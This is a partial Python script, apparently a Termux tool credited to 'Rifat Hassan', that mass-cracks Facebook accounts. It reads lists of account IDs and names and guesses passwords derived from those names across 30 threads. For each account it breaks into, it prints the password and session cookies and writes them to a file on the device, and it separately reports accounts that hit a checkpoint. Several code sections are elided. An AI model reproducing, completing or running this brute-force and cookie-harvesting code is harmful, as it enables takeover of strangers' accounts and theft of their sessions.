...
$$ |  $$ |  $$ |  $$ |      $$ |  $$ |  $$ |   
$$ |  $$ |$$$$$$\ $$ |      $$ |  $$ |  $$ |   
\__|  \__|\______|\__|      \__|  \__|  \__|{A}[{R}XD-123{A}]
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
{A}({R}+{A}) {A}DEVLOPER {R}: {A}RIFAT HASSAN
{A}({R}+{A}) {A}FACEBOOK {R}: {A}RIFAT HASSAN
{A}({R}+{A}) {A}GITHUB   {R}: {A}ROLEX-999
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   """)
print(logo)
def menu():
        try:
                        ...
                        if xd in ['1','01']:
                                clear();print(f'{A}({R}+{A}) {A}EXAMPLE  {R}: {A}/sdcard/rifat.txt ');mn()
                                ...
                                print(f'{A}({R}+{A}) {A}{R}({A}EXAMPLE{R}) {A}first last {R}~ {A}first123 {R}~ {A}57273200');mn();clear();print(f'{A}({R}+{A}) {A}DO YOU WENT SHOW CP ACCOUNT : {R}({A}Y{R}/{A}N{R})');mn();cx=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'{A}({R}+{A}) {A}TOTAL ACCOUNT {R}:{A} '+total_ids+f' ');print(f'{A}({R}+{A})\x1b[38;5;46m {A}TOTAL-PASS {R}:{A} {ps_limit}');print(f'{A}({R}+{A}) ID NA ASLE BIMAN CALAO 🙂👍');print(f'{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤')                             
                                        for user in fo:
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{R}({A}RIFAT-123{R}) {R}- {R}({A}METHOD-N{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{R}({A}RIFAT-OK{R})\x1b[38;5;46m '+ids+f' |\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{R}({A}COOKIE{R}){A} "+coki)
                                        mn()
                                        open('/sdcard/RIFAT--OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}({A}RIFAT-OK{R}) '+ids+' | '+pas+'{R}')
